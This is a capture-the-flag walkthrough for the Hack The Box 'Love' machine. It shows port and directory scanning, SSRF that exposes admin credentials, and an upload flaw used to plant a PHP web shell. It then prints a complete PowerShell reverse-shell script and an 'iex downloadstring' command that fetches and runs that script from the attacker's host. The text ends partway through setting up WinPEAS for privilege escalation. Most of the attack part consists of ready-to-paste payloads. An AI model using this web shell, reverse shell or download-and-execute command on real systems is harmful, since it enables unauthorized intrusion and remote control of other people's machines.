# Love-Step-By-Step

First of all open a terminal window and scan the ip providaded by htb with nmap.
Copy-paste this into your terminal:
````
 sudo nmap --min-rate 1000 -T4 <machine-ip>
````
The result shows all open ports:
````
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 18:26 -0300
Nmap scan report for love.htb (10.129.48.103)
Host is up (0.41s latency).
Not shown: 991 closed tcp ports (reset)
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
443/tcp  open  https
445/tcp  open  microsoft-ds
3306/tcp open  mysql
5000/tcp open  upnp
5985/tcp open  wsman
5986/tcp open  wsmans

Nmap done: 1 IP address (1 host up) scanned in 3.05 seconds
````

List the open ports and execute a more in-depth dearch in them:
Copy-paste this into your terminal:
````
─$ sudo nmap -A -sC --min-rate 1000 -p80,135,139,443,445,3306,5000,5985,5986 10.129.48.103
````
The result shows services, common known protocols and also other estimations over the ports we passed with the command:
````
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-10 18:29 -0300
Nmap scan report for love.htb (10.129.48.103)
Host is up (0.34s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Voting System using PHP
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in
| Not valid before: 2021-01-18T14:00:16
|_Not valid after:  2022-01-18T14:00:16
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: 403 Forbidden
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql        MariaDB 10.3.24 or later (unauthorized)
5000/tcp open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp open  ssl/wsmans?
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: 2026-09-10T21:52:28+00:00; +21m34s from scanner time.
| ssl-cert: Subject: commonName=LOVE
| Subject Alternative Name: DNS:LOVE, DNS:Love
| Not valid before: 2021-04-11T14:39:19
|_Not valid after:  2024-04-10T14:39:19
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 10
OS CPE: cpe:/o:microsoft:windows_10
OS details: Microsoft Windows 10 1709 - 22H2
Network Distance: 2 hops
Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: Love
|   NetBIOS computer name: LOVE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-09-10T14:52:13-07:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-09-10T21:52:16
|_  start_date: N/A
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h06m34s, deviation: 3h30m02s, median: 21m32s

TRACEROUTE (using port 3306/tcp)
HOP RTT       ADDRESS
1   423.04 ms 10.10.16.1
2   218.79 ms love.htb (10.129.48.103)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.83 seconds

````
We have a domain and a subdomain being shown. Add them to your hosts file:
Copy-paste this into the command terminal:
````
echo "<machine-ip> love.htb staging.love.htb" | sudo tee -a /etc/hosts
````
Using either of them'll find the following at http:
<img width="685" height="553" alt="image" src="https://github.com/user-attachments/assets/73562e5e-aa65-4416-887f-fb960bf6927a" />
This won't be of much use for us right now.
Take a look at the directories at love.htb using ffuf:
````
└─$ ffuf -w ~/Documents/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt -u http://love.htb/FUZZ 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://love.htb/FUZZ
 :: Wordlist         : FUZZ: /home/spaz/Documents/seclists/Discovery/Web-Content/raft-large-directories-lowercase.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

includes                [Status: 301, Size: 332, Words: 22, Lines: 10, Duration: 318ms]
images                  [Status: 301, Size: 330, Words: 22, Lines: 10, Duration: 318ms]
admin                   [Status: 301, Size: 329, Words: 22, Lines: 10, Duration: 160ms]
plugins                 [Status: 301, Size: 331, Words: 22, Lines: 10, Duration: 160ms]
webalizer               [Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 163ms]
phpmyadmin              [Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 159ms]
dist                    [Status: 301, Size: 328, Words: 22, Lines: 10, Duration: 158ms]
tcpdf                   [Status: 301, Size: 329, Words: 22, Lines: 10, Duration: 159ms]
licenses                [Status: 403, Size: 417, Words: 37, Lines: 12, Duration: 255ms]
server-status           [Status: 403, Size: 417, Words: 37, Lines: 12, Duration: 200ms]
con                     [Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 199ms]
aux                     [Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 160ms]
prn                     [Status: 403, Size: 298, Words: 22, Lines: 10, Duration: 180ms]
server-info             [Status: 403, Size: 417, Words: 37, Lines: 12, Duration: 172ms]
:: Progress: [56162/56162] :: Job [1/1] :: 207 req/sec :: Duration: [0:04:25] :: Errors: 0 ::
````
Out off all of them, admin is the one that stands out the most, here it says Username. Also when admin was inputed there a "wrong password" message was displayed meaning admin is a viable user, we'll return to that leter:
<img width="555" height="563" alt="image" src="https://github.com/user-attachments/assets/82f2ed22-6942-4c17-9a72-856e2366bb2c" />

For now go to http://staging.love.htb:
<img width="1916" height="726" alt="image" src="https://github.com/user-attachments/assets/288dda46-eaeb-4b3f-84ec-a31e51480613" />

Here a file scanner for scanning malware, there is a demo section:
<img width="1917" height="725" alt="image" src="https://github.com/user-attachments/assets/484c3d2e-93c8-4fbb-8c66-980a7efeda2e" />

We are able to reach local host with it, meaning we can reach ports and services only open server-side:
<img width="1101" height="647" alt="image" src="https://github.com/user-attachments/assets/da16471b-0184-4f99-8c36-fb3c522a77c3" />

You should try to hit all ports you got back from nmap uding this, you'll get a hit from 5000:
<img width="912" height="526" alt="image" src="https://github.com/user-attachments/assets/992cb325-8f19-4f09-92ce-32f53a7b252f" />

We got creds admin:@LoveIsInTheAir!!!!
<img width="912" height="526" alt="image" src="https://github.com/user-attachments/assets/6ff88fa8-9d4b-4e45-9261-7ee0a13d0cb6" />

Test the credentials over at http://love.htb/admin:
<img width="600" height="546" alt="image" src="https://github.com/user-attachments/assets/0ed41aa6-6336-4ba8-ac3d-1f68949c77ed" />

Here click on the update button:
<img width="282" height="277" alt="image" src="https://github.com/user-attachments/assets/c0eccd64-613b-4c71-8451-1ef9d4d4daca" />

See the browse button. It allows us to upload images. But the site has no sanitization, so we are going to use it to upload a .php shell.
<img width="600" height="467" alt="image" src="https://github.com/user-attachments/assets/e8486b60-6f2f-43d6-9980-290cc686f310" />

Create a file called cmd.php and copy-paste the following into it:
````
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
````

Next upload cmd.php into the website:
<img width="605" height="467" alt="image" src="https://github.com/user-attachments/assets/94b0d79b-2f6e-4e8b-ae0b-17faf0423b5c" />

And access it via the browser at http://love.htb/images/cmd.php. Images is the folder that all images are stored, by calling cmd.php inside it we can call our php shell:
<img width="1917" height="447" alt="image" src="https://github.com/user-attachments/assets/de181700-65d9-438d-83f9-35ee25ac8651" />

Try whoami to cofirm coomand execution and realize we are operating as phoebe:
<img width="1917" height="340" alt="image" src="https://github.com/user-attachments/assets/7e521fa9-afa9-49d5-a89b-db6e201c825e" />

Now, we could actually read the user.txt from here. But Let's get a better shell:
Copy-paste the following into a file named shell.ps1, just change <your-ip> to your tun0 ip:
````
$client = New-Object System.Net.Sockets.TCPClient('<your-ip>',9001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
````

Then create a www directory, move shell.ps1 into it and open a simple python server inside it:
````
mkdir www
mv shell.ps1 www
cd www
python -m http.server
````
Open a new terminal window and start a NetCat listener:
Copy-paste this into you terminal:
````
nc -lnvp 9001
````
Now go back to your cmd.php shell.
Copy-paste the following into the cmd line:
````
powershell iex(new-object net.webclient).downloadstring('http://<your-ip>:8000/shell.ps1')
````

<img width="1917" height="487" alt="image" src="https://github.com/user-attachments/assets/f4c16480-b0b9-42a3-8fcf-bf113634738f" />

You should get a confirmation from the server that you got a GET request:
<img width="1917" height="97" alt="image" src="https://github.com/user-attachments/assets/c80cea10-2f09-486f-8e98-c1fc80539df4" />

And a return from the listener:
<img width="1917" height="142" alt="image" src="https://github.com/user-attachments/assets/8253fce2-9700-4aa4-bd2f-8e0053756726" />

Navigate to phoebe's desktop and type the user.txt.
Copy-paste the following into the nc shell:
````
type \users\phoebe\desktop\user.txt
````
<img width="1917" height="152" alt="image" src="https://github.com/user-attachments/assets/6e9320c1-64b8-4bf4-a5e6-3bec1d5ebc8d" />

For enumeration we are going to use WinPEAS. Go to https://github.com/peass-ng/PEASS-ng and enter the WinPEAS folder:
<img width="1060" height="796" alt="image" src="https://github.com/user-attachments/assets/0f9ee5a7-9ac7-48ff-8d77-4cad25f51f54" />

There download winpeas.exe and move it into te same folder you have the python server running:











